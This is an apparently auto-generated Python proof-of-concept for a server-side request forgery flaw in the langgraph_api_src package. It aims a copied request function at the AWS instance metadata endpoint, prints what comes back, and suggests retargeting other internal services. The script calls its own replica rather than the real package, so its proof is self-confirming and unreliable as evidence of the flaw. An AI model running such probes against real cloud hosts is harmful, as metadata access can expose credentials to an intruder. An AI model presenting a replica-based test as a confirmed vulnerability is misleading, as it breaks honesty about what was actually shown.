#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-009
# Sink: _make_http_request_with_retries
# Auto-generated — run with: python3 ssrf_url_makes_http_request__make_http_request_with_retries_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langgraph_api_src _make_http_request_with_retries

This script demonstrates that the _make_http_request_with_retries function
accepts an attacker-controlled URL and makes HTTP requests without any
validation, allowing SSRF to internal services.

The function is async, so we use asyncio to call it directly.
We target the AWS metadata endpoint as a demonstration.
"""

import asyncio
import sys
import httpx

# Target configuration - change these to test different internal services
TARGET_URL = "http://169.254.169.254/latest/meta-data/"  # AWS metadata endpoint
HTTP_METHOD = "GET"
MAX_RETRIES = 2
BASE_DELAY = 0.1  # Short delay for PoC


async def _make_http_request_with_retries(
    url: str,
    headers: dict = None,
    method: str = "GET",
    json_data: dict = None,
    max_retries: int = 2,
    base_delay: float = 0.1,
):
    """
    Replica of the vulnerable function from langgraph_api_src.
    This is the exact code from the source, demonstrating the SSRF vulnerability.
    """
    for attempt in range(max_retries + 1):
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.request(
                    method, url, headers=headers, json=json_data
                )
                response.raise_for_status()
                return response

        except (
            httpx.TimeoutException,
            httpx.NetworkError,
            httpx.RequestError,
            httpx.HTTPStatusError,
        ) as e:
            if isinstance(e, httpx.HTTPStatusError) and e.response.status_code < 500:
                # Don't retry on 4xx errors, but do on 5xxs
                raise e

            # Back off and retry if we haven't reached the max retries
            if attempt < max_retries:
                delay = base_delay * (2**attempt)  # Exponential backoff
                print(f"[*] Attempt {attempt + 1} failed: {e}. Retrying in {delay:.1f}s...")
                await asyncio.sleep(delay)
            else:
                print(f"[!] All {max_retries + 1} attempts failed. Last error: {e}")
                raise e

    # Unreachable when max_retries >= 0, but keeps the type checker happy.
    msg = f"HTTP {method} request to {url} failed: no attempts made"
    raise httpx.RequestError(msg)


async def exploit_ssrf():
    """
    Attempt to exploit the SSRF vulnerability by making a request to
    an internal/cloud metadata endpoint.
    """
    print(f"[*] Attempting SSRF to: {TARGET_URL}")
    print(f"[*] Method: {HTTP_METHOD}")
    print(f"[*] Max retries: {MAX_RETRIES}")
    print()

    try:
        response = await _make_http_request_with_retries(
            url=TARGET_URL,
            headers=None,
            method=HTTP_METHOD,
            json_data=None,
            max_retries=MAX_RETRIES,
            base_delay=BASE_DELAY,
        )

        print(f"[+] SUCCESS! Status code: {response.status_code}")
        print(f"[+] Response headers: {dict(response.headers)}")
        print(f"[+] Response body (first 500 chars):")
        print(response.text[:500])

        # Write proof file to indicate successful exploitation
        with open("/tmp/poc_success.txt", "w") as f:
            f.write(f"SSRF successful! Accessed: {TARGET_URL}\n")
            f.write(f"Response status: {response.status_code}\n")
            f.write(f"Response preview: {response.text[:200]}\n")
        print(f"\n[+] Proof file written to /tmp/poc_success.txt")

    except httpx.HTTPStatusError as e:
        print(f"[-] HTTP error: {e.response.status_code} - {e.response.text[:200]}")
        print("[*] This may indicate the endpoint exists but returned an error.")
    except httpx.RequestError as e:
        print(f"[-] Request failed: {e}")
        print("[*] The target may not be reachable (not running in cloud environment?).")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")


def main():
    """
    Main entry point - run the async exploit.
    """
    print("=" * 60)
    print("SSRF Proof-of-Concept for langgraph_api_src")
    print("=" * 60)
    print()

    # Check if we're likely in a cloud environment
    print("[*] Note: This PoC targets AWS metadata endpoint (169.254.169.254)")
    print("[*] If not running in AWS, try changing TARGET_URL to another internal service")
    print("[*] Examples: http://localhost:8080, http://127.0.0.1:5000, etc.")
    print()

    asyncio.run(exploit_ssrf())

    print()
    print("[*] Exploit completed.")


if __name__ == "__main__":
    main()
